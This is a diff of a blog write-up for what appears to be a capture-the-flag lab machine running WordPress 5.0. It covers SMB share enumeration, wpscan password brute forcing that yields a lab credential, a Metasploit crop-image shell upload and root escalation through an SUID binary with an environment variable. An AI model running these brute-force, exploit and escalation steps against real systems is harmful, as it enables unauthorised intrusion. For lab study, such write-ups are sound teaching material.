@@ -11,18 +11,17 @@ comments: false
 <br>
 <br>
 <br>
-## nmap shows: 
+## Starting with an nmap scan, we see: 
 22/tcp  open  ssh
 80/tcp  open  http
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
 
-## Let's do an SMB scan
-
+## Let's do an SMB scan to check for any shares
 ## smbmap shows:
-        print$                                                  NO ACCESS       Printer Drivers
-        BillySMB                                                READ, WRITE     Billy's local SMB Share
-        IPC$                                                    NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
+        print$                              NO ACCESS       Printer Drivers
+        BillySMB                            READ, WRITE     Billy's local SMB Share
+        IPC$                                NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
    
 
 <br>
@@ -40,7 +39,7 @@ check-this opens a urlcode to a billy joel music vido
 {% endhighlight bash %}
 <br>
 
-## As this machine details that a wordpress blog is being used lets check it out:
+## This machine details that a wordpress blog is being used, lets check it out:
 {% highlight bash %}
 wpscan --update
 wpscan -H 
@@ -52,12 +51,13 @@ bjoel
 kwheel
 
 ## we can brute force passwords for these usernames 
-wpscan --url http://10.201.58.182 --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
+wpscan --url http://<target_IP> --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
 
 
-## We get karen Wheelers username and password
-Username: kwheel, Password: cutiepie1
+## We get Karen Wheelers username and password
+Username: kwheel, Password: cutiepie1[redacted]
 
+## We now need to find the login page
 ## Looking at robots.txt: 
 User-agent: *
 Disallow: /wp-admin/
@@ -68,64 +68,65 @@ Allow: /wp-admin/admin-ajax.php
 *** /wp-content shows another dead end
 {% endhighlight bash %}
 
-## login page at:
-/wp-admin/
+## We find the login page at: /wp-admin/
+
+<br>
+## This is WordPress 5.0
+## We find out that there is a known vulnerability:
+## "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)",
+
+<br>
+## Searching WordPress 5.0 on Metasploit we can run exploit  #0
+> 0   exploit/multi/http/wp_crop_rce   
+>enter: USERNAME PASSWORD RHOST AND LHOST AND LPORT
+
+<br>
+## We get a meterpreter shell as www-data
+
+<br>
+## Looking for the user flag, we see it's not where we think it is:
 
 
-## We can login at /wp-admin
-
-## Attempting to upload payloads shows filters preventing the php script
-
-
-This is WordPress 5.0, which is vulnerable! 
-If we take a look at exploit-db, We find out that there is a vulnerability "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)",
+<br>
+## Looking for clues we see a termination letter
 
 
+<br>
+## The company is "rubber ducky" and billy joel was let go for illegal use of removable media
+## Say no more, let's check /media/usb
+## Denied !
 
-Searching WordPress 5.0 on Metasploit we can run exploit  #0
-0   exploit/multi/http/wp_crop_rce   
-enter USERNAME PASSWORD RHOST AND LHOST AND LPORT
+## We will need to escalate our privileges
+Let try searching binaries with the SUID bit set: 
+find / -type f -perm -04000 -ls 2>/dev/null 
 
-
-
-We get shell as www-data
-
-
-Looking for the user flag we see its not where we think it is:
-
-
-Looking for clues we see a termination letter
-
-
-The company is rubber ducky and billy joel was let go for illegal use of removable media
-lets check /media/usb -- denied
-
-
-let try find / -type f -perm -04000 -ls 2>/dev/null 
-
-We see something interesting
-
+<br>
+## We see something interesting:
 /usr/sbin/checker
 
+## This is a root owned binary, with SUID flag on
+## It gets the "admin" environment variable and prints out "Not an Admin".
 
-it is a root owned binary, with SUID flag on
+********
 
-
- it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?
-
+## Let's see if we can set this environment variable
 
 $ export admin=1
 $ ltrace checker
 
+<br>
 
-so now it tries to run bash! And since this is owned by root, it'll run bash as root! 
+## Now it tries to run bash as root
+## When we run again:
 /usr/sbin/checker
 
+## We now get root and see the user flag where we tried to look before
 
- We now get root and see the user flag where we tried to look before
-We also now get root flag
-!!!!!!!!!!!
+*************
 
+## We also now get root flag 
+
+*************
 
 
 
